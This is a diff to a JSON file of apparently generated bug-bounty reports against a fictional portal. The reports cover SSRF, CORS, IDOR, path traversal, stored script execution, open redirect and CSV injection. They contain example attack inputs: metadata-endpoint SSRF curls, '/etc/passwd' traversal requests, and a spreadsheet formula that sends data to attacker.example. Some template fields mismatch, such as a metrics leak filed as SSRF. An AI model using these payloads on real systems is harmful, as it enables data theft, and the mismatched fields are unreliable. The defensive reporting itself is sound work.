+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://payments.rabenbrunn-it.foo/api/import`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8684,7 +8751,8 @@
           "offset": "8d 21h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://payments.rabenbrunn-it.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8819,7 +8887,8 @@
           "offset": "2d",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.rabenbrunn-it.foo/profile`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8962,7 +9031,8 @@
           "offset": "7d 19h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.rabenbrunn-it.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9113,7 +9183,8 @@
           "offset": "9d 9h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.rabenbrunn-it.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9224,7 +9295,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.rabenbrunn-it.foo/api/me`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9363,7 +9435,8 @@
           "offset": "5d 20h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.rabenbrunn-it.foo/console/queue`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -9474,7 +9547,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://payments.rabenbrunn-it.foo/admin/queue`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -9585,7 +9659,8 @@
           "offset": "3d 8h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.rabenbrunn-it.foo/fetch`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9764,7 +9839,8 @@
           "offset": "9d",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.rabenbrunn-it.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9919,7 +9995,8 @@
           "offset": "7d 3h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.rabenbrunn-it.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10071,7 +10148,8 @@
           "offset": "6d 2h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.rabenbrunn-it.foo/export`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10174,7 +10252,8 @@
           "offset": "16h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.rabenbrunn-it.foo/admin/items`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -10321,7 +10400,8 @@
           "offset": "4d 10h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://payments.rabenbrunn-it.foo/profile`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10424,7 +10504,8 @@
           "offset": "3d 3h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://payments.rabenbrunn-it.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10584,7 +10665,8 @@
           "offset": "3d 18h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://payments.rabenbrunn-it.foo/admin/items`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -10679,7 +10761,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.rabenbrunn-it.foo/fetch`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10810,7 +10893,8 @@
           "offset": "13h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://payments.rabenbrunn-it.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10940,7 +11024,8 @@
           "offset": "4d 7h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://payments.rabenbrunn-it.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11080,7 +11165,8 @@
           "offset": "21h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://payments.rabenbrunn-it.foo/console/queue`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -11207,7 +11293,8 @@
           "offset": "5d 21h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://payments.rabenbrunn-it.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11333,7 +11420,8 @@
           "offset": "3d 20h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.rabenbrunn-it.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11444,7 +11532,8 @@
           "offset": "11h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://payments.rabenbrunn-it.foo/api/v2/documents/`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11584,7 +11673,8 @@
           "offset": "7d 21h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://payments.rabenbrunn-it.foo/api/documents/`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11695,7 +11785,8 @@
           "offset": "1d 12h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://payments.rabenbrunn-it.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11870,7 +11961,8 @@
           "offset": "7d",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://payments.rabenbrunn-it.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12037,7 +12129,8 @@
           "offset": "7d 20h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://payments.rabenbrunn-it.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12165,7 +12258,8 @@
           "offset": "9h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://payments.rabenbrunn-it.foo/api/v2/documents/`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12314,7 +12408,8 @@
           "offset": "5d 15h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.rabenbrunn-it.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12433,7 +12528,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://payments.rabenbrunn-it.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12581,7 +12677,8 @@
           "offset": "2d 19h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.rabenbrunn-it.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12744,7 +12841,8 @@
           "offset": "5d 12h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
